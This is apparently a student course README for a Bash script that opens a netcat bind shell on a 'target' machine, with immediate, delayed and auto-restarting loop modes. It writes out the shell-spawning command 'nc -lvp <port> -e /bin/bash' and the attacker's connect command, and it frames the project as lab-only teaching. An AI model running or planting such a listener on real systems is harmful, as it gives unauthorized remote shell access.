# 🎯 Scheduled Listener using Netcat

**Course:** COSC/ITAP 3411 - Bash Shell Scripting  
**Team Name:** Theta  
**Project Submission:** November 30, 2025

---

## 📖 Project Description

This project implements a **Scheduled Netcat Listener** - a Bash script that creates a bind shell on a target machine. The listener waits on a specified port for incoming connections from an attacker's machine. The script offers three scheduling options:

1. **Immediate start** - Listener starts right away
2. **Delayed start** - Listener starts after a user-specified delay (using `sleep` command)
3. **Continuous mode** - Listener runs in a loop, automatically restarting after each connection

This is a practical demonstration of Bash scripting concepts including user input, conditional statements, loops, and network tools.

---

## 👥 Team Members (Theta Team)

| Student Name | Contribution |
|--------------|--------------|
| **Student 1** | Script design, user input validation, and port number handling |
| **Student 2** | Scheduling logic implementation (sleep, loops, and netcat integration) |
| **Student 3** | Error handling, testing, and debugging |
| **Student 4** | Documentation (README), presentation preparation, and GitHub setup |

---

## ⚙️ Technical Requirements

### Software Requirements:
- **Operating System:** Linux (tested on Kali Linux)
- **Shell:** Bash (/bin/bash)
- **Tools:** Netcat (nc command)

### Prerequisites:
- Basic understanding of Bash scripting
- Two machines on the same network (target and attacker)
- Execute permissions on the script file

---

## 🚀 Installation & Setup

### Step 1: Clone the Repository

```bash
git clone https://github.com/ITAP/COSC-3411/Theta.git
cd Theta
```

### Step 2: Give Execute Permission

Before running the script, you must give it execute permission:

```bash
chmod +x scheduled_listener.sh
```

**Explanation:**
- `chmod` = change mode (change file permissions)
- `+x` = add execute permission
- Without this, you'll get "Permission denied" error

### Step 3: Verify Permission

Check that the permission was set correctly:

```bash
ls -l scheduled_listener.sh
```

You should see something like:
```
-rwxr-xr-x 1 user user 4567 Nov 15 10:30 scheduled_listener.sh
```

The `x` in the permissions means it's executable.

---

## 💻 Usage Instructions

### Running the Script

Execute the script using:

```bash
./scheduled_listener.sh
```

**Note:** The `./` tells Linux to run the script from the current directory.

### Script Workflow

1. **Enter Port Number**
   - You'll be prompted to enter a port number (e.g., 4444)
   - Ports below 1024 require root privileges
   - Recommended range: 1024-65535

2. **Choose Scheduling Option**
   - Option 1: Start immediately
   - Option 2: Start after delay
   - Option 3: Continuous loop mode

3. **Wait for Connection**
   - The script will display connection information
   - From attacker machine, connect using: `nc <target_ip> <port>`

---

## 📝 Example Usage

### Example 1: Immediate Listener

```bash
$ ./scheduled_listener.sh

==========================================
   Scheduled Netcat Listener Tool
   Team Theta - COSC/ITAP 3411
==========================================

Enter the port number to listen on (e.g., 4444): 4444
✓ Port 4444 is valid

Select Scheduling Option:
1) Start listener immediately
2) Start listener after a delay (using sleep)
3) Start listener at repeated intervals (loop mode)

Enter your choice (1, 2, or 3): 1

==========================================
Starting listener immediately on port 4444
==========================================

Listener Status: ACTIVE
Listening on: 0.0.0.0:4444
Waiting for incoming connections...

INSTRUCTIONS FOR ATTACKER:
  Connect from another machine using:
  nc <this_machine_ip> 4444

Press CTRL+C to stop the listener

Listening on 0.0.0.0 4444
```

**From Attacker Machine:**
```bash
nc 192.168.1.100 4444
# You now have shell access to the target machine!
```

---

### Example 2: Delayed Start

```bash
$ ./scheduled_listener.sh

Enter the port number to listen on (e.g., 4444): 5555
✓ Port 5555 is valid

Select Scheduling Option:
1) Start listener immediately
2) Start listener after a delay (using sleep)
3) Start listener at repeated intervals (loop mode)

Enter your choice (1, 2, or 3): 2

Enter delay time in seconds (e.g., 10): 15

==========================================
Scheduling listener with 15 second delay
==========================================

Current time: Sun Nov 10 14:30:00 AST 2025
Listener will start at: Sun Nov 10 14:30:15 AST 2025

Status: WAITING...
Starting in 15 seconds...
Starting in 14 seconds...
...
Starting in 1 seconds...

==========================================
Listener Status: ACTIVE
==========================================
```

---

### Example 3: Continuous Loop Mode

```bash
$ ./scheduled_listener.sh

Enter the port number to listen on (e.g., 4444): 6666
✓ Port 6666 is valid

Select Scheduling Option:
1) Start listener immediately
2) Start listener after a delay (using sleep)
3) Start listener at repeated intervals (loop mode)

Enter your choice (1, 2, or 3): 3

Enter interval between restarts in seconds (e.g., 30): 20

==========================================
Starting CONTINUOUS listener mode
==========================================
Port: 6666
Restart interval: 20 seconds

The listener will automatically restart if connection drops
Press CTRL+C to stop

----------------------------------------
Attempt #1 - Sun Nov 10 14:35:00 AST 2025
Listener Status: ACTIVE
Listening on: 0.0.0.0:6666
----------------------------------------
```

**Behavior:** When the connection closes, the listener automatically restarts after 20 seconds.

---

## 🔧 How It Works

### Script Structure

```
1. Display welcome banner
2. Get port number from user (read -p)
3. Validate port number (if/elif/else)
4. Display scheduling options menu
5. Get user's choice
6. Execute based on choice:
   ├─ Choice 1: Run nc immediately
   ├─ Choice 2: Use sleep + countdown loop, then run nc
   └─ Choice 3: Run nc in infinite while loop with sleep
```

### Key Bash Concepts Used

| Concept | Command/Syntax | Purpose |
|---------|----------------|---------|
| **Shebang** | `#!/bin/bash` | Tells OS to use Bash interpreter |
| **Comments** | `#` | Explain code logic |
| **User Input** | `read -p "prompt: " variable` | Get input from user |
| **Variables** | `port=4444` | Store values |
| **Conditionals** | `if [ condition ]; then ... fi` | Make decisions |
| **Comparisons** | `-eq`, `-lt`, `-gt`, `-z` | Compare values |
| **Loops** | `while [ condition ]; do ... done` | Repeat actions |
| **Counter** | `((counter++))` | Increment variables |
| **Sleep** | `sleep 10` | Pause execution |
| **Netcat** | `nc -lvp <port> -e /bin/bash` | Create listener |
| **Date** | `$(date)` | Get current date/time |
| **Exit** | `exit 1` | Stop script with error code |

---

## 🛡️ Security & Educational Purpose

⚠️ **IMPORTANT DISCLAIMER:**

This tool is created **strictly for educational purposes** as part of the COSC/ITAP 3411 course curriculum. 

**Ethical Guidelines:**
- Only use this script in controlled lab environments
- Never deploy on systems without explicit permission
- Understand local laws regarding cybersecurity tools
- This demonstrates security concepts - not intended for malicious use

**Bind Shell Explanation:**
- The victim machine opens a port and waits
- The attacker connects to that port
- The attacker gains remote shell access
- Firewalls often block such connections (security measure)

---

## 🧪 Testing the Script

### Test Environment Setup

You need two machines:

**Machine 1 (Target/Victim):**
- IP Address: 192.168.1.100
- Runs: `./scheduled_listener.sh`

**Machine 2 (Attacker):**
- IP Address: 192.168.1.200
- Runs: `nc 192.168.1.100 4444`

### Test Cases

| Test Case | Expected Result |
|-----------|----------------|
| Valid port (4444) | ✓ Listener starts successfully |
| Port below 1024 (port 80) | ⚠️ Warning about root privileges |
| Port above 65535 | ❌ Error message |
| Empty port input | ❌ Error message |
| Invalid choice (4) | ❌ Error message |
| Delayed start (10 sec) | ✓ Countdown shown, then starts |
| Loop mode | ✓ Restarts automatically after connection |
| CTRL+C pressed | ✓ Script stops cleanly |

---

## ❓ Troubleshooting

### Common Issues

**Problem 1: "Permission denied"**
```
Solution: Run chmod +x scheduled_listener.sh
```

**Problem 2: "nc: command not found"**
```
Solution: Install netcat
sudo apt-get install netcat
```

**Problem 3: "Address already in use"**
```
Solution: Port is occupied. Try a different port or stop the process using:
sudo lsof -i :4444
sudo kill -9 <PID>
```

**Problem 4: Can't connect from attacker machine**
```
Solution: Check firewall settings or ensure both machines are on same network
```

**Problem 5: Need root for low port numbers**
```
Solution: Run script with sudo for ports below 1024:
sudo ./scheduled_listener.sh
```

---

## 📚 Learning Outcomes

By completing this project, students will understand:

1. ✅ How to write structured Bash scripts with proper formatting
2. ✅ User input handling with validation
3. ✅ Conditional logic (if/elif/else) for decision making
4. ✅ Loop structures (while loops) for repetition
5. ✅ Netcat tool for network communication
6. ✅ Sleep command for scheduling tasks
7. ✅ Error handling and user feedback
8. ✅ Practical cybersecurity concepts (bind shells)
9. ✅ Code documentation and commenting best practices
10. ✅ GitHub collaboration and version control

---

## 📂 Repository Structure

```
Theta/
├── scheduled_listener.sh    # Main script file
├── README.md               # This documentation
├── presentation/
│   ├── slides.pdf         # Presentation slides
│   └── demo_video.mp4     # Demo recording
└── screenshots/
    ├── immediate_mode.png
    ├── delayed_mode.png
    └── loop_mode.png
```

---

## 🎓 References

- Course Slides: "BASH Shell Scripting - COSC/ITAP 3411"
- Netcat Documentation: `man nc`
- Bash Scripting Guide: Advanced Bash-Scripting Guide (ABS)
- Cybersecurity Ethics: SANS Institute Guidelines

---

## 📧 Contact

For questions or issues, please contact Team Theta members through the course portal.

**GitHub Repository:** https://github.com/ITAP/COSC-3411/Theta

---

## 📅 Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | Nov 15, 2025 | Initial release |
| 1.1 | Nov 20, 2025 | Added error handling improvements |
| 1.2 | Nov 25, 2025 | Final testing and documentation updates |

---

**Last Updated:** November 25, 2025  
**Project Status:** ✅ Complete and Tested  
**Grade Target:** 100/100 🎯